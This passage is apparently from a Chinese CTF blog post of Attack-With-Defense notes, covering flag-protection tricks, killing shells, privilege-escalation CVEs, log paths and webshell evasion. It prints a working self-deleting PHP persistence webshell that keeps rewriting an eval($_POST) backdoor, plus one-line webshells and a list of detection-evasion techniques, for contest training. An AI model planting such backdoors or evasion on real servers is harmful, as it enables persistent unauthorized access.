class="string">&quot;</span></span><br><span class="line"><span class="string">获取fIag一般是curl http:/xxx.com/flag.txt</span></span><br><span class="line"><span class="string">alias curl=&#x27;echo fuckoff&#x27;#权限要求较低，可以在这里改成虚假的fIag</span></span><br><span class="line"><span class="string">#或者</span></span><br><span class="line"><span class="string">chmod-xcur|#权限要求较高</span></span><br><span class="line"><span class="string">/usr/bin curl.路径</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="杀不死马"><a href="#杀不死马" class="headerlink" title="杀不死马"></a>杀不死马</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -aux | grep www-data | grep -v grep | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs <span class="built_in">kill</span> -9</span><br></pre></td></tr></table></figure>
+
+<h2 id="清除反弹shell"><a href="#清除反弹shell" class="headerlink" title="清除反弹shell"></a>清除反弹shell</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps -ef / px -aux</span><br><span class="line">出现www-data权限的/bin/sh一般为nc</span><br></pre></td></tr></table></figure>
+
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CVE-2017-6074</span><br><span class="line">CVE-2016-5195</span><br><span class="line">CVE-2016-8655</span><br><span class="line">CVE-2017-1000367</span><br><span class="line">CVE-2016-1247</span><br></pre></td></tr></table></figure>
+
+<h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h2><p>命令行动态查看日志(较少用)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tailf /var/log/apache2/access.log</span><br></pre></td></tr></table></figure>
+
+<p>日志常见存储位置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/var/log/apache2/</span><br><span class="line">/usr/local/apache2/logs</span><br><span class="line">/usr/nginx/logs</span><br></pre></td></tr></table></figure>
+
+<p>手动修改代码记录日志</p>
+<h2 id="干扰对手"><a href="#干扰对手" class="headerlink" title="干扰对手"></a>干扰对手</h2><p>Xray&amp;dirsearch</p>
+<h1 id="webshell变迁史"><a href="#webshell变迁史" class="headerlink" title="webshell变迁史"></a>webshell变迁史</h1><h2 id="大马"><a href="#大马" class="headerlink" title="大马"></a>大马</h2><h2 id="小马"><a href="#小马" class="headerlink" title="小马"></a>小马</h2><h2 id="一句话木马-1"><a href="#一句话木马-1" class="headerlink" title="一句话木马"></a>一句话木马</h2><h2 id="内存马"><a href="#内存马" class="headerlink" title="内存马"></a>内存马</h2><p>内存马是无文件攻击的一种常用手段<br>攻击原理：利用软件安全漏洞，构造恶意输入导致软件在处理输入数据时出现非预期错误，将输入数据写入内存中的某些特定敏感位置，从而劫持软件控制流、执行流，转而执行外部输入的指令代码，造成目标系统被获取远程控制。</p>
+<h2 id="php不死马"><a href="#php不死马" class="headerlink" title="php不死马"></a>php不死马</h2><p>通过内存马启动后删除文件本身之前，使代码在内存中执行死循环，使管理员无法删除内存马，达到权限维持的目的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">set_timelimit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ignore_user_abort</span>(<span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">  <span class="variable">$content</span> =<span class="string">&#x27;&lt;?php @eval($_POST[&quot;123&quot;]) ?&gt;&#x27;</span></span><br><span class="line">  <span class="title function_ invoke__">file_put_contents</span> (<span class="string">&quot;.config.php&quot;</span>, <span class="variable">$content</span>);</span><br><span class="line">  <span class="title function_ invoke__">usleep</span>(<span class="number">10000</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="python内存马"><a href="#python内存马" class="headerlink" title="python内存马"></a>python内存马</h2><p>通过SSTI或命令执行组成新的恶意服务接口</p>
+<h2 id="一些绕过方式"><a href="#一些绕过方式" class="headerlink" title="一些绕过方式"></a>一些绕过方式</h2><h2 id="java内存马"><a href="#java内存马" class="headerlink" title="java内存马"></a>java内存马</h2><p>在客户端发起web请求的这个过程中对内存中修改已有的组件或者动态注册一个新的组件，插入恶意的shellcode</p>
+<h2 id="Java-web的三大组件"><a href="#Java-web的三大组件" class="headerlink" title="Java web的三大组件"></a>Java web的三大组件</h2><p>Listener、Filter、Servlet</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.servlet-api类</span><br><span class="line">2.filter型</span><br><span class="line">3.servlet型</span><br><span class="line">4.spring类</span><br><span class="line">5.拦截器</span><br><span class="line">6.cortro|Ier型</span><br><span class="line">7.Java Instrumentation</span><br><span class="line">8.agent型</span><br></pre></td></tr></table></figure>
+
+<h1 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h1><p>常规webshell检测的方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- 基于规则库的静态检测，如关键词、高危函数等</span><br><span class="line">- 通过Webshell运行时使用的系统命令或者网络流量及状态的异常来判断动作的威胁程度</span><br><span class="line">- 分析日志中的异常情况</span><br><span class="line">- 统计学检测，通过信息嫡、最长单词、重合指数、压缩比等检测</span><br></pre></td></tr></table></figure>
+<h2 id="免杀在线检测平台"><a href="#免杀在线检测平台" class="headerlink" title="免杀在线检测平台"></a>免杀在线检测平台</h2><p>webshellchop 长亭<br><a target="_blank" rel="noopener" href="https://stack.chaitin.com/security-challenge/webshell/index">https://stack.chaitin.com/security-challenge/webshell/index</a><br>WEBDIR+ 百度<br>河马在线查杀<br>D盾</p>
+<p>##常见PHP Webshell的类型<br>直接型</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">123</span>]);</span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="variable">$_POST</span>[<span class="number">123</span>]);</span><br></pre></td></tr></table></figure>
+<p>技巧型</p>
+<p>##webshell的数据传输<br>多种传输方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">- <span class="variable">$_GET</span></span><br><span class="line">- <span class="variable">$_POST</span></span><br><span class="line">- <span class="variable">$_COOKIE</span></span><br><span class="line">- <span class="variable">$_REQUEST</span></span><br><span class="line">- $_<span class="variable">$SERVER</span> 其中的某些参数可控，如 REQUESTMETHOD,QUERYSTRING,HTTPUSERAGENT</span><br><span class="line">- <span class="title function_ invoke__">session_id</span>()</span><br><span class="line">- <span class="variable">$_FILE</span></span><br><span class="line">- <span class="variable">$_GLOBALS</span></span><br><span class="line">- <span class="title function_ invoke__">getallheaders</span>()</span><br><span class="line">- <span class="title function_ invoke__">getdefinedvars</span>()</span><br><span class="line">- <span class="title function_ invoke__">getdefinedfunctions</span>()</span><br></pre></td></tr></table></figure>
+<h3 id="php-webshell免杀思路"><a href="#php-webshell免杀思路" class="headerlink" title="php webshell免杀思路"></a>php webshell免杀思路</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">字符串异或</span><br><span class="line">字符串各种编码加密</span><br><span class="line">字符串拼接</span><br><span class="line">混淆免杀</span><br><span class="line">函数替换</span><br><span class="line">自定义函数绕过</span><br><span class="line">变形回调</span><br><span class="line">数组</span><br><span class="line">可变变量</span><br><span class="line">利用版本差异</span><br></pre></td></tr></table></figure>
+
+<h1 id="CMS审计"><a href="#CMS审计" class="headerlink" title="CMS审计"></a>CMS审计</h1><h2 id="wordpress"><a href="#wordpress" class="headerlink" title="wordpress"></a>wordpress</h2><p>直接使用WPscan扫一下看看有没有洞</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://target.com</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://goodlunatic.github.io/2023/11/17/AWD%20Basic%20and%20Scripts/" data-id="clp20hn0c000ilg3z8p57cbo8" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/AWD/" rel="tag">AWD</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>
+
+    </footer>
+  </div>
+  
+  
+<nav id="article-nav">
+  
+  
+    <a href="/2023/11/10/Nodejs%20Basic%20and%20Vulnerability/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Nodejs Basic and Vulnerability</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/ACM/">ACM</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/BlockChain/">BlockChain</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">23</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Course/">Course</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Courses/">Courses</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Database/">Database</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Hexo/">Hexo</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Language/">Language</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Misc/">Misc</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Raspberry-Pi/">Raspberry-Pi</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Skills/">Skills</a><span class="category-list-count">16</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/WriteUp/">WriteUp</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/">年终总结</a><span class="category-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/ACM/" style="font-size: 10px;">ACM</a> <a href="/tags/AI/" style="font-size: 10px;">AI</a> <a href="/tags/AWD/" style="font-size: 10px;">AWD</a> <a href="/tags/BlockChain/" style="font-size: 10px;">BlockChain</a> <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/Course/" style="font-size: 10px;">Course</a> <a href="/tags/Courses/" style="font-size: 13.33px;">Courses</a> <a href="/tags/Crypto/" style="font-size: 11.67px;">Crypto</a> <a href="/tags/Deep-Learning/" style="font-size: 10px;">Deep Learning</a> <a href="/tags/Docker/" style="font-size: 10px;">Docker</a> <a href="/tags/Git/" style="font-size: 10px;">Git</a> <a href="/tags/Hexo/" style="font-size: 11.67px;">Hexo</a> <a href="/tags/Java/" style="font-size: 10px;">Java</a> <a href="/tags/JavaScript/" style="font-size: 10px;">JavaScript</a> <a href="/tags/Leetcode/" style="font-size: 10px;">Leetcode</a> <a href="/tags/Machine-Learning/" style="font-size: 10px;">Machine Learning</a> <a href="/tags/Misc/" style="font-size: 15px;">Misc</a> <a href="/tags/Mysql/" style="font-size: 10px;">Mysql</a> <a href="/tags/Nodejs/" style="font-size: 10px;">Nodejs</a> <a href="/tags/PHP/" style="font-size: 10px;">PHP</a> <a href="/tags/Program/" style="font-size: 10px;">Program</a> <a href="/tags/Pwn/" style="font-size: 11.67px;">Pwn</a> <a href="/tags/Python/" style="font-size: 11.67px;">Python</a> <a href="/tags/Raspberry-Pi/" style="font-size: 10px;">Raspberry-Pi</a> <a href="/tags/Reverse/" style="font-size: 10px;">Reverse</a> <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">SQL注入</a> <a href="/tags/Skills/" style="font-size: 18.33px;">Skills</a> <a href="/tags/Web/" style="font-size: 16.67px;">Web</a> <a href="/tags/WriteUp/" style="font-size: 10px;">WriteUp</a> <a href="/tags/forensics/" style="font-size: 10px;">forensics</a> <a href="/tags/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/" style="font-size: 10px;">年终总结</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/10/">October 2023</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/09/">September 2023</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">August 2023</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/06/">June 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/02/">February 2023</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">January 2023</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/12/">December 2022</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/11/">November 2022</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a><span class="archive-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/11/17/AWD%20Basic%20and%20Scripts/">AWD Basic and Scripts</a>
+          </li>
+        
+          <li>
+            <a href="/2023/11/10/Nodejs%20Basic%20and%20Vulnerability/">Nodejs Basic and Vulnerability</a>
+          </li>
+        
+          <li>
+            <a href="/2023/11/08/Java%20Learning%20Record/">Java Learning Record</a>
+          </li>
+        
+          <li>
+            <a href="/2023/11/08/Python%20Basic/">Python Basic</a>
+          </li>
+        
+          <li>
+            <a href="/2023/11/07/%E7%AC%AC%E5%85%AD%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B(%E5%A4%8D%E7%9B%98)/">第六届浙江省大学生网络与信息安全竞赛-复盘</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+    <div class="widget-wrap toc">
+  <h3 class="widget-title">Catalog</h3>
+  <div class="widget"></div>
+</div>
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2023 Lunatic<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/about" class="mobile-nav-link">About</a>
+  
+    <a href="/Friends" class="mobile-nav-link">Friends</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+<!-- Toc -->
+
+<script src="/js/toc.js"></script>
+
+<!-- Toc -->
+  </div>
+</body>
+</html>
